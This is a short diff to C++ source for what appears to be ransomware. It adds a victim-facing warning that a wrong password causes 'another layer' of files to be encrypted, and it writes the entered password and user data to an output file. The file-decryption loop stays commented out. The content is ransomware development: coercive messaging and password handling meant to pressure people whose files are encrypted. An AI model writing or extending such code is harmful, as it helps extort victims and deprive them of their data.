@@ -183,6 +183,9 @@ int main()
         if (passwordStatus == 1) {
             break;
         }
+        else{
+            std::cout << "You just provided a wrong password. Another layer of your files have been encrypted." << std::endl;
+        }
     }
 
     // for (const fs::path &file : files)
@@ -190,7 +193,11 @@ int main()
     //     decryptFileContent(file.string(), privKey, rng);
     // }
 
-    std::cout << password << "\n" << userdata << std::endl;
+    std::ofstream outFile("output.txt");
+    if (outFile.is_open()) {
+        outFile << password << "\n" << userdata << std::endl;
+        outFile.close();
+    }
     
     
     return 0;
